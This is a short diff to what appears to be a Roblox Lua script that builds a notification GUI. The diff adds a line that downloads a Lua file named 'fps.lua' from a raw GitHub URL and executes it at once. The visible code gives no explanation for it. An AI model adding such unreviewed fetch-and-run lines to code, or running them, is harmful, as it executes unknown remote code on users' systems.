@@ -1,3 +1,7 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/yuhaodatt/script/main/TS/fps.lua"))()
+
+
+
 notificationGui = Instance.new("ScreenGui")
 notificationGui.Enabled = true  
 notificationGui.IgnoreGuiInset = true 
